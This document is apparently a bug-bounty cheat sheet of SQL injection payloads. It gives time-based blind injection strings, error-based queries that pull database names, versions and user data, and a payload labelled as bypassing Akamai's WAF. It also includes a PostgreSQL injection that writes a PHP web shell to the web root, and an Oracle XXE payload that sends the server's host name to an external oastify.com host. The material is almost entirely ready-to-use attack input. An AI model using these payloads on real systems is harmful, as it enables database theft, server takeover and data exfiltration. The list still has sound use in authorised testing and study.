# SQL Injection Payloads
## Time Based SQL Payloads
```sql
WAITFOR DELAY '0:0:5'
'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
')orsleep(5)='
1))orsleep(5)#
"))orsleep(5)="
'))orsleep(5)='
;waitfor delay'0:0:5'--
);waitfor delay'0:0:5'--
';waitfor delay'0:0:5'--
";waitfor delay'0:0:5'--
');waitfor delay'0:0:5'--
");waitfor delay'0:0:5'--
));waitfor delay'0:0:5'--
{"param":"1")))+MySQL_payload--+--}
/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
%2c(select*from(select(sleep(20)))a)
{{"sleep"%2c"13"})}${{"timeout"%2c"13"})
+UNION+SELECT+1,2,3,CONCAT(user(),version(),database()),5,6,7,8--+r0hack"}
{sleep(hexdec(dechex(13)))}${sleep(hexdec(dechex(13)))}
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
'+(select*from(select(sleep(20)))a)+'
%20and%20(select%20*%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true (sleeps 5 sec)
" AND (length(database())) = "11 --+-
```
## Other SQL Injection Payloads
```sql
+OR+1=insert(1,1,1,1)--
+OR+1=replace(1,1,1)--
{`foo`/*bar*/(select+1)\}'
{`foo`/*bar*/(select%2b2)}
{`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a
```
## Akami WAF Bypass
```sql
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

## You can use the PostgreSQL \g command in your SQLi to create a file on the server. 
```sql
' UNION SELECT '<?php $out = shell_exec($_GET["x"]); echo "<pre>$out</pre>";?>' \g /var/www/test.php; --
```
**Example**<br>
[![img](https://pbs.twimg.com/media/EpNcPxHW8AEP2v1?format=jpg&name=large)](https://twitter.com/bugbountynights/status/1338515958567227393?s=20)

## Oracle SQL Injection
```sql
𝗮'||(𝘀𝗲𝗹𝗲𝗰𝘁+𝗲𝘅𝘁𝗿𝗮𝗰𝘁𝘃𝗮𝗹𝘂𝗲(𝘅𝗺𝗹𝘁𝘆𝗽𝗲('<?𝘅𝗺𝗹+𝘃𝗲𝗿𝘀𝗶𝗼𝗻="𝟭.𝟬"+𝗲𝗻𝗰𝗼𝗱𝗶𝗻𝗴="𝗨𝗧𝗙-𝟴"?><!𝗗𝗢𝗖𝗧𝗬𝗣𝗘+𝗿𝗼𝗼𝘁+[+<!𝗘𝗡𝗧𝗜𝗧𝗬 %+𝘅𝘅𝗲+𝗦𝗬𝗦𝗧𝗘𝗠+"𝗵𝘁𝘁𝗽://𝗰𝗰𝘀𝗿𝗵𝟯𝟰𝘃𝟵𝘁𝘄𝗳𝘀𝗻𝗰𝗳𝘀𝗹𝘂𝗽𝘂𝗱𝘀𝟵𝟯𝟬𝟵𝗿𝘅𝗵𝗹𝟲.𝗼𝗮𝘀𝘁𝗶𝗳𝘆.𝗰𝗼𝗺/'||𝗦𝗬𝗦_𝗖𝗢𝗡𝗧𝗘𝗫𝗧('𝗨𝗦𝗘𝗥𝗘𝗡𝗩','𝗛𝗢𝗦𝗧')||'">%𝘅𝘅𝗲;]>'),'/𝗹')+𝗳𝗿𝗼𝗺+𝗱𝘂𝗮𝗹)||'
```
![img](/SQL-Payloads/assets/1725186738108.jpg)
